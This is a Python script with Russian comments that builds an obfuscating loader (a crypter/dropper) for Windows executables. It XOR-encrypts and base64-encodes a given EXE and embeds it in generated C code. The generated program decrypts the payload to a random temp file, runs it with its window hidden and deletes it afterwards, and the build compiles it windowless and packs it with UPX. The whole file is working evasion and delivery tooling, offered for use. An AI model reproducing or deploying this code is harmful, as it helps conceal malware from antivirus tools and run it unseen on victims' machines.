# dll_injector.py - ПРОСТОЙ И РАБОЧИЙ
import os
import sys
import subprocess
import random
import string
import base64

def generate_random_name():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_single_exe_with_dll(exe_path):
    print("=" * 60)
    print("SIMPLE LOADER BUILDER")
    print("=" * 60)
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        return None
    
    output_dir = os.path.dirname(exe_path)
    
    print("Reading source EXE...")
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
    
    if exe_data[0] != 0x4D or exe_data[1] != 0x5A:
        print("ERROR: Not a valid EXE!")
        return None
    print("EXE header OK (MZ)")
    
    print("Encrypting with XOR...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(exe_data):
        encrypted.append(byte ^ key[i % len(key)])
    
    # Base64 (без HEX - меньше раздувания)
    data_b64 = base64.b64encode(encrypted).decode('ascii')
    key_b64 = base64.b64encode(key).decode('ascii')
    
    print("Creating loader...")
    
    loader_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

static const char enc_data[] = "{data_b64}";
static const char xor_key[] = "{key_b64}";

void base64_decode(const char* input, unsigned char* output, int* out_len) {{
    DWORD size = 0;
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
    *out_len = size;
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, output, &size, NULL, NULL);
}}

void xor_decrypt(unsigned char* data, int len, const char* key, int key_len) {{
    for(int i = 0; i < len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

void run_payload() {{
    // Декодируем base64
    int data_len = 0;
    unsigned char* decoded = (unsigned char*)malloc(strlen(enc_data));
    if (!decoded) return;
    base64_decode(enc_data, decoded, &data_len);
    
    // Расшифровываем XOR
    unsigned char* decrypted = (unsigned char*)malloc(data_len);
    if (!decrypted) {{ free(decoded); return; }}
    memcpy(decrypted, decoded, data_len);
    xor_decrypt(decrypted, data_len, xor_key, strlen(xor_key));
    
    // Проверка EXE
    if (decrypted[0] != 0x4D || decrypted[1] != 0x5A) {{
        MessageBoxA(NULL, "Not a valid EXE!", "Error", MB_OK);
        free(decoded);
        free(decrypted);
        return;
    }}
    
    // Сохраняем во временный файл
    char tmp[MAX_PATH];
    char fn[13];
    GetTempPathA(MAX_PATH, tmp);
    const char* c = "abcdefghijklmnopqrstuvwxyz0123456789";
    for(int i = 0; i < 12; i++) {{
        fn[i] = c[rand() % 36];
    }}
    fn[12] = '\\0';
    strcat(tmp, fn);
    strcat(tmp, ".exe");
    
    HANDLE f = CreateFileA(tmp, GENERIC_WRITE, 0, NULL,
                          CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {{
        DWORD w;
        WriteFile(f, decrypted, data_len, &w, NULL);
        CloseHandle(f);
        
        // ЗАПУСКАЕМ С UAC (НЕ СКРЫВАЕМ)
        STARTUPINFOA si = {{sizeof(si)}};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
                       NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Sleep(9000);
        DeleteFileA(tmp);
    }}
    
    free(decoded);
    free(decrypted);
}}

int main() {{
    run_payload();
    Sleep(15000);
    return 0;
}}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Compiling loader...")
    loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
    
    cmd = [
        'gcc',
        loader_src,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows',
        '-lcrypt32'
    ]
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True)
        print("Compilation OK")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e.stderr.decode()}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True, check=True)
        print("UPX compression OK")
    except:
        print("UPX compression skipped or failed")
    
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Size: {final_size:.2f} MB")
    print("=" * 60)
    
    try:
        os.remove(loader_src)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_single_exe_with_dll(exe_path)
